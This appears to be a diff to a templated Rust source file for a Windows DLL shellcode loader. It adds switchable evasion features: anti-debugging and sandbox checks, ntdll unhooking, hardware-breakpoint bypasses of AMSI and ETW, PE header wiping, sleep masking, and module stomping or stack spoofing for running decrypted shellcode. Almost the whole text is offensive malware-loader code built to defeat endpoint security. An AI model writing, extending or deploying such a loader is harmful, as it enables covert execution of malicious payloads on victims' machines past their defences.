@@ -16,11 +16,27 @@ pub unsafe extern "system" fn DllMain(
 pub unsafe extern "system" fn DllRegisterServer() { {{ v.fn_run }}(); }
 
 unsafe fn {{ v.fn_run }}() {
-    {%- if "AmsiHwbp" in feature_names %}
-    scaffold::bypass::amsi_hwbp::install_amsi_bypass();
+    {%- if "AntiDebug" in feature_names %}
+    if scaffold::evasion::anti_debug::is_debugged() { return; }
+    {%- endif %}
+    {%- if "SandboxUser" in feature_names %}
+    if !scaffold::sandbox::usercheck::looks_real() { return; }
     {%- endif %}
     {%- if "UnhookDisk" in feature_names %}
     scaffold::evasion::unhook::unhook_ntdll_disk();
+    {%- endif %}
+    {%- if "UnhookKnownDlls" in feature_names %}
+    scaffold::evasion::unhook::unhook_ntdll_knowndlls();
+    {%- endif %}
+    {%- if "AmsiHwbp" in feature_names %}
+    scaffold::bypass::amsi_hwbp::install_amsi_bypass();
+    {%- endif %}
+    {%- if "EtwHwbp" in feature_names %}
+    scaffold::bypass::etw_hwbp::install_etw_bypass();
+    scaffold::bypass::etw_hwbp::patch_etw_full();
+    {%- endif %}
+    {%- if "PeCloak" in feature_names %}
+    scaffold::evasion::pe_cloak::wipe_pe_headers();
     {%- endif %}
 
     let {{ v.var_shellcode }}: &[u8] = &[
@@ -35,5 +51,16 @@ unsafe fn {{ v.fn_run }}() {
     let {{ v.var_ptr }} = scaffold::crypto::decrypt_aes256(
         {{ v.var_shellcode }}, &{{ v.var_key }}, &{{ v.var_iv }}
     ).unwrap();
+
+    {%- if "SleepEncrypt" in feature_names %}
+    scaffold::evasion::sleep_mask::masked_sleep_jitter(3000);
+    {%- endif %}
+
+    {%- if "ModuleStomp" in feature_names %}
+    scaffold::inject::exec::run_stomped(&{{ v.var_ptr }});
+    {%- elif "StackSpoof" in feature_names %}
+    scaffold::inject::exec::run_no_rwx_spoof(&{{ v.var_ptr }});
+    {%- else %}
     scaffold::inject::exec::run_no_rwx(&{{ v.var_ptr }});
+    {%- endif %}
 }
